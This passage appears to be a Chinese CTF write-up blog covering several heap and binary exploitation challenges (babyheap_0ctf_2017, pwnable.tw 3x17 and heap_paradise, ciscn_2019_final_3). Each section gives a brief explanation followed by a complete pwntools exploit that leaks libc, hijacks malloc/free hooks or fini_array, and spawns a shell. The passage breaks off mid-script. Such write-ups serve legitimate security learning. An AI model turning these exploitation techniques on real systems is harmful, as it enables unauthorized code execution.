<p>可以先将堆块置于<code>unsorted bin</code>里面，由于从<code>unsorted bin</code>里面取出堆块时，不会检查大小，因此可以通过修改大小来造成堆块重叠，从而实现对<code>libc</code>地址的泄露，并且可以写入非法地址，并获取到对应地址进行任意写</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先利用unsorted bin泄露libc，然后利用fastbin attack伪造fd实现对malloc_hook的写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,28445)</span></span><br><span class="line">io = process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu_</span>(<span class="params">num</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc_</span>(<span class="params">size</span>):</span><br><span class="line">    menu_(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill_</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    menu_(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_</span>(<span class="params">index</span>):</span><br><span class="line">    menu_(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_</span>(<span class="params">index</span>):</span><br><span class="line">    menu_(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">alloc_(<span class="number">0xa0</span>)  <span class="comment">#index0</span></span><br><span class="line">alloc_(<span class="number">0xa0</span>)  <span class="comment">#index1</span></span><br><span class="line">alloc_(<span class="number">0x10</span>)  <span class="comment">#index2, in order to prevent index1 to mix with top chunk.</span></span><br><span class="line"></span><br><span class="line">free_(<span class="number">0</span>)</span><br><span class="line">alloc_(<span class="number">0x10</span>)  <span class="comment">#index0</span></span><br><span class="line">fill_(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">alloc_(<span class="number">0xa0</span>)  <span class="comment">#index3</span></span><br><span class="line">fill_(<span class="number">3</span>, <span class="number">0x90</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#there are two pointers pointing to index1.(index3 and index1)</span></span><br><span class="line"><span class="comment">#we can free index1 firstly, and then we will get a addr close to libc.</span></span><br><span class="line"></span><br><span class="line">free_(<span class="number">1</span>)</span><br><span class="line">dump_(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">io.recv(<span class="number">0x18</span>)</span><br><span class="line">main_area = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_area ===&gt; &#x27;</span>+<span class="built_in">hex</span>(main_area))</span><br><span class="line">libcbase = main_area - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    alloc_(<span class="number">0x60</span>)     <span class="comment">#1 4 5 6 7 8 9 10 11 12</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">free_(<span class="number">10</span>)</span><br><span class="line">fill_(<span class="number">9</span>, <span class="number">0x78</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">alloc_(<span class="number">0x60</span>)</span><br><span class="line">alloc_(<span class="number">0x60</span>)</span><br><span class="line">fill_(<span class="number">13</span>,<span class="number">0x23</span>-<span class="number">0x10</span>+<span class="number">8</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span>+p64(libcbase+one_gadget[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">alloc_(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-pwnable-tw-3×17-fini-array劫持"><a href="#0x02-pwnable-tw-3×17-fini-array劫持" class="headerlink" title="0x02.pwnable.tw - 3×17( fini_array劫持 )"></a>0x02.pwnable.tw - 3×17( fini_array劫持 )</h3><p>先<code>checksec</code>看到只开了NX，partial relro</p>
<p>该程序为静态编译程序，把所有要用到的库函数都编译进了这个程序，而且必定会有<code>syscall</code></p>
<p>由于程序结束后会执行<code>libc_csu_fini</code>函数，该函数中会依次调用<code>fini_array[1]</code>和<code>fini_array[0]</code>，可以改写<code>fini_array[0]</code>为<code>libc_csu_fini</code>函数的地址，<code>fini_array[1]</code>为<code>main</code>函数地址。这样程序会不断进行调用。</p>
<p>在<code>main</code>函数中可以看到要使<code>byte_4B9330</code>为1时才能进行地址改写，但实际上不需要理会这个条件，因为在循环的过程中，它会自行溢出为1。</p>
<p>由于<code>libc_csu_fini</code>函数中存在语句<code>lea  rbp, off_4B40F0</code>，会导致<code>rbp</code>值为<code>fini_array</code>地址，通过改写<code>fini_array+0x10</code>数据为<code>gadgets</code>，然后修改<code>fini_array[0]</code>为<code>leave_ret</code>的<code>gadget</code>进行栈迁移，即可getshell。</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先布置fini_array+0x10位置的数据，最后进行leave_ret栈迁移即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,25099)</span></span><br><span class="line">io = process(<span class="string">&#x27;./3x17&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./3x17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">syscall = <span class="number">0x446e2c</span></span><br><span class="line">start = <span class="number">0x401b6d</span></span><br><span class="line">fini_array = <span class="number">0x4b40f0</span></span><br><span class="line">csu_fini = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4b4100</span></span><br><span class="line">leave_ret = <span class="number">0x401c4b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">addr, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(addr).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">change(fini_array, p64(csu_fini)+p64(start))</span><br><span class="line">payload = [pop_rdi, <span class="number">0</span>, pop_rsi, bss-<span class="number">0x100</span>, pop_rdx, <span class="number">0x10</span>, pop_rax, <span class="number">0</span>, syscall, \</span><br><span class="line">           pop_rdi, bss-<span class="number">0x100</span>, pop_rsi, <span class="number">0</span>,   pop_rdx,  <span class="number">0</span>,   pop_rax, <span class="number">59</span>, syscall]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    change(bss+i*<span class="number">8</span>,p64(payload[i]))</span><br><span class="line"></span><br><span class="line">change(fini_array, p64(leave_ret)+p64(start)+p64(pop_rdi))</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>



<h3 id="0x03-ciscn-2019-final-3-tcache-poisoning-UAF"><a href="#0x03-ciscn-2019-final-3-tcache-poisoning-UAF" class="headerlink" title="0x03.ciscn_2019_final_3( tcache poisoning + UAF )"></a>0x03.ciscn_2019_final_3( tcache poisoning + UAF )</h3><p><code>checksec</code>看到保护全开</p>
<p>一个c++堆题目，为了做这个题，我另外下了个ubuntu18。。。</p>
<p>没有<code>show</code>功能，以为要爆破<code>stdout</code>打出libc，看了wp才知道是劫持<code>tcache_struct</code>来实现分配到libc，进而泄露出libc</p>
<p>大致步骤为：由于程序会泄露堆地址，先利用 <code>tcache stash</code> 机制绕过<code>double free</code>的检查分配到<code>tcache_struct</code>位置，修改其值为刚好释放该块时可以进入<code>unsorted bin</code>的值，从而在<code>tcache</code>中的<code>fd</code>为会修改为libc中的某个值，从而通过<code>gift</code>泄露出来。之后再次劫持堆块，分配到<code>__free_hook</code>位置，修改为<code>system</code>函数地址，<code>free</code>掉存有<code>/bin/sh\x00</code>的堆块。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28698</span>)</span><br><span class="line">file = <span class="string">&#x27;./ciscn_final_3&#x27;</span></span><br><span class="line"><span class="comment">#io = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;choice &gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;something\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gifts</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;gift :0x&#x27;</span>)</span><br><span class="line">    address = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;gift ===&gt; &#x27;</span>+<span class="built_in">hex</span>(address))</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache stash机制进行double free</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">tcache_struct = gifts() - <span class="number">0x12270</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    remove(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;tcache struct ===&gt; &#x27;</span>+<span class="built_in">hex</span>(tcache_struct))</span><br><span class="line">remove(<span class="number">7</span>)           <span class="comment">#fastbin 0x70: 7 -&gt; 8 -&gt; 7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">16</span>):</span><br><span class="line">    add(i,<span class="number">0x70</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x70</span>,p64(tcache_struct+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x70</span>,<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x70</span>,<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x70</span>,(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(tcache_struct+<span class="number">0x10</span>)*<span class="number">6</span>)         <span class="comment">#该堆块为tcache_struct结构体</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">19</span>)            <span class="comment">#19堆块会进入unsorted bin中</span></span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#申请到libc  （因为tcache_struct进入unsorted bin，其tcache_struct+0x10位置被设置为libc中的位置，再次分配便会从tcache中取出该位置块）</span></span><br><span class="line"></span><br><span class="line">libcbase = gifts() - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">free_hook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__free_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">22</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(free_hook))   <span class="comment">#再次修改tcache_struct</span></span><br><span class="line">add(<span class="number">23</span>,<span class="number">0x10</span>,p64(sys))           <span class="comment">#分配到free_hook</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="task06"><a href="#task06" class="headerlink" title="task06"></a>task06</h2><h3 id="0x01-pwnable-tw-heap-paradise-UAF-fastbin-attack"><a href="#0x01-pwnable-tw-heap-paradise-UAF-fastbin-attack" class="headerlink" title="0x01.pwnable.tw - heap paradise ( UAF + fastbin attack )"></a>0x01.pwnable.tw - heap paradise ( UAF + fastbin attack )</h3><p><code>checksec</code>看到保护全开，</p>
<p>这道题给我做的心态爆炸，像是照着wp抄了一遍，每一步都要注意和后面的联系，还要注意分配堆块的数量，爆破直接手动，写一个固定的地址，一直运行，打远程的时候似乎因为服务器在国外，一直超时，拿个j8的flag（总结：我是彩笔</p>
<p>大概步骤在exp里面写了：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#先fastbin attack分配到堆区域修改某个堆块的size，使得可以free进入unsorted bin，然后partial write爆破stdout结构体，输出libc，最后fastbin attack打malloc_hook</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10308</span>)</span><br><span class="line">file = <span class="string">&#x27;./heap_paradise&#x27;</span></span><br><span class="line"><span class="comment">#io = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You Choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size, data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Data :&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io, <span class="string">&#x27;set resolve-heap-via-heuristic on&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>))     <span class="comment">#0            loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x31</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x21</span>))     <span class="comment">#1            loc-1</span></span><br><span class="line">	     <span class="comment">#2            loc-2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)             <span class="comment">#0 -&gt; 1 -&gt; 0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x20&#x27;</span>)     <span class="comment">#2    loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment">#3    loc-1</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x20&#x27;</span>)     <span class="comment">#4    loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)    <span class="comment">#5    loc-0.5</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xa1</span>))   <span class="comment">#6</span></span><br><span class="line">free(<span class="number">5</span>)             <span class="comment">#进入unsorted bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x78</span>, (p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))*<span class="number">4</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xa0&#x27;</span>)          <span class="comment">#7    loc-0.5    partial overwrite修改到stdout</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\xc5&#x27;</span>)          <span class="comment">#8      loc-1    partial overwrite将loc-0.5放入fastbin链表中</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>))          <span class="comment">#9      loc-0</span></span><br><span class="line">alloc(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0xfbad2087</span>+<span class="number">0x1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)          <span class="comment">#10     修改stdout结构体</span></span><br><span class="line">               <span class="comment">#(__IO_stdout)c620-0x43=c5dd</span></span><br><span class="line">leak = io.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line">loc = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;\x7f&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> leak:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> leak:</span><br><span 